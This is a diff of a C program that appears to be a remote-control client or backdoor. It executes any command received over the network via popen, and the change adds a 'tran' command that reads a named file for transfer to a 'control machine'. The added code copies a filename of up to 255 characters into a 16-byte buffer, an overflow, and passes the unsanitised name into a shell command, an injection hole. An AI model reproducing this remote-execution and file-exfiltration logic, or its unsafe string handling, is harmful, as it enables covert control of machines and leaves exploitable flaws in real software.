@@ -46,7 +46,7 @@ int sendOnline() {
 int main(int argc, char const *argv[]) {
     int x, z, ret;
     char *control_ip = "127.0.0.1";
-    char command[16], path[128];
+    char command[16], path[128], filename[256];
     pthread_t thread;
 
     FILE *fp;  // it will open a stream for the output of command
@@ -108,9 +108,14 @@ int main(int argc, char const *argv[]) {
             run = 1;
         }
         // transfer file to the control machine
-        else if (strcmp(command, "tran\n") == 0) {
+        else if (strcmp(command, "tran") == 0) {
             bzero(command, sizeof(command));
             // ...
+            sscanf(datagram, "%*5s%s", filename);
+            strcpy(command, "cat ");
+            strcat(command, filename);
+            fp = popen(command, "r");
+            bzero(command, sizeof(command));
         }else
             fp = popen(datagram, "r");  // opening a stream by executing the command
         bzero(datagram, sizeof(datagram));
